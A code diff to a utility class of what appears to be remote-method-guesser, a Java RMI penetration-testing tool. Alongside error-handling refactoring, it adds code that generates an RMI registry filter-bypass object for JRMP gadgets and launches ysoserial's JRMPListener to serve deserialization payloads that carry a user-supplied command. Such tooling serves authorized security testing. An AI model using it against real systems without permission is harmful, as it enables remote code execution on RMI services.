@@ -19,8 +19,10 @@ import java.util.Properties;
 import java.util.UUID;
 
 import de.qtc.rmg.Starter;
+import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Logger;
+import de.qtc.rmg.operations.RegistryClient;
 import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -33,6 +35,8 @@ import javassist.NotFoundException;
 
 @SuppressWarnings({ "rawtypes", "deprecation" })
 public class RMGUtils {
+
+    private static boolean alwaysShowExceptions = false;
 
     private static ClassPool pool;
     private static CtClass dummyClass;
@@ -47,8 +51,7 @@ public class RMGUtils {
             remoteClass = pool.getCtClass(Remote.class.getName());
             remoteStubClass = pool.getCtClass(RemoteStub.class.getName());
         } catch (NotFoundException e) {
-            Logger.printlnMixedYellow("Caught", "NotFoundException", "during initialisation of RMGUtils.");
-            RMGUtils.exit();
+            ExceptionHandler.internalError("RMGUtils.init", "Caught unexpected NotFoundException.");
         }
 
         dummyClass = pool.makeInterface("de.qtc.rmg.Dummy");
@@ -91,7 +94,7 @@ public class RMGUtils {
             intf.defrost();
 
         } catch (ClassNotFoundException | NotFoundException e) {
-            /*gadget
+            /*
              * className is not known and was not created before. This is usually expected.
              * In this case, we just create the class :)
              */
@@ -191,6 +194,9 @@ public class RMGUtils {
         int functionStart = signature.indexOf(' ');
         int argumentsStart = signature.indexOf('(') + 1;
         int argumentsEnd = signature.indexOf(')');
+
+        if(functionStart <= 0 || argumentsStart <= 1 || argumentsEnd <= 0)
+            ExceptionHandler.invalidSignature(signature);
 
         List<String> types = new ArrayList<String>();
         types.add(signature.substring(0, functionStart));
@@ -337,12 +343,25 @@ public class RMGUtils {
 
     public static Object getPayloadObject(String ysoPath, String gadget, String command) {
 
+        if(gadget.equals("JRMPClient2") || gadget.equals("AnTrinh")) {
+
+            String[] split = command.split(":");
+            if(split.length != 2 || !split[1].matches("\\d+")) {
+                ExceptionHandler.invalidListenerFormat(true);
+            }
+
+            try {
+                return RegistryClient.generateBypassObject(split[0], Integer.valueOf(split[1]));
+            } catch (Exception e) {
+                ExceptionHandler.unexpectedException(e, "bypass object", "generation", true);
+            }
+        }
+
         Object ysoPayload = null;
         File ysoJar = new File(ysoPath);
 
         if( !ysoJar.exists() ) {
-            Logger.eprintlnMixedYellow("Error:", ysoJar.getAbsolutePath(), "does not exist.");
-            RMGUtils.exit();
+            ExceptionHandler.internalError("RMGUtils.getPayloadObject", "Error: " + ysoJar.getAbsolutePath() + " does not exist.");
         }
 
         Logger.print("Creating ysoserial payload...");
@@ -358,20 +377,16 @@ public class RMGUtils {
         } catch (MalformedURLException | ClassNotFoundException | NoSuchMethodException | SecurityException |
                 IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
 
-            Throwable ex = e;
-            if( e instanceof InvocationTargetException )
-                ex = e.getCause();
-
-            Logger.eprintlnMixedYellow("Error: Unable to create ysoserial gadget", gadget);
-            Logger.eprintlnMixedYellow("Error message is:", ex.getMessage());
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
+            ExceptionHandler.unexpectedException(e, "gadget", "generation", true);
         }
 
-        Logger.printlnPlain("done.");
+        Logger.printlnPlain(" done.");
         return ysoPayload;
     }
 
+    /*
+     * Taken from https://stackoverflow.com/questions/17747175/how-can-i-loop-through-exception-getcause-to-find-root-cause-with-detail-messa
+     */
     public static Throwable getCause(Throwable e)
     {
         Throwable cause = null;
@@ -404,9 +419,7 @@ public class RMGUtils {
             configStream.close();
 
         } catch( IOException e ) {
-            Logger.eprintlnMixedYellow("Unable to load properties file", filename);
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
+            ExceptionHandler.unexpectedException(e, "loading", ".properties file", true);
         }
     }
 
@@ -436,6 +449,7 @@ public class RMGUtils {
     /*
      * Taken from https://stackoverflow.com/questions/46454995/how-to-hide-warning-illegal-reflective-access-in-java-9-without-jvm-argument
      */
+    @SuppressWarnings("restriction")
     public static void disableWarning()
     {
         try {
@@ -464,5 +478,61 @@ public class RMGUtils {
         }
 
         return false;
+    }
+
+    public static Throwable getThrowable(String name, Throwable e)
+    {
+        Throwable exception = e;
+        Throwable cause = e.getCause();
+
+        while((exception != cause) && (cause != null)) {
+
+            if( cause.getClass().getSimpleName().equals(name))
+                return cause;
+
+            exception = cause;
+            cause = exception.getCause();
+        }
+
+        return null;
+    }
+
+    public static void showStackTrace(boolean b)
+    {
+        RMGUtils.alwaysShowExceptions = b;
+    }
+
+    public static void showStackTrace(Exception e)
+    {
+        if(alwaysShowExceptions) {
+            Logger.eprintln("");
+            RMGUtils.stackTrace(e);
+        }
+    }
+
+    public static void createListener(String ysoPath, String port, String gadget, String command)
+    {
+        File ysoJar = new File(ysoPath);
+
+        if( !ysoJar.exists() ) {
+            ExceptionHandler.internalError("RMGUtils.createListener", "Error: " + ysoJar.getAbsolutePath() + " does not exist.");
+        }
+
+        try {
+            URLClassLoader ucl = new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
+
+            Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
+            Method method = yso.getDeclaredMethod("main", new Class[] {String[].class});
+
+            Logger.printMixedYellow("Creating a", "JRMPListener", "on port ");
+            Logger.printlnPlainBlue(port + ".");
+            Logger.printlnMixedBlue("Handing off to", "ysoserial...");
+
+            method.invoke(null, new Object[] {new String[] {port, gadget, command}});
+            System.exit(0);
+
+        } catch( Exception e ) {
+            ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
+        }
     }
 }
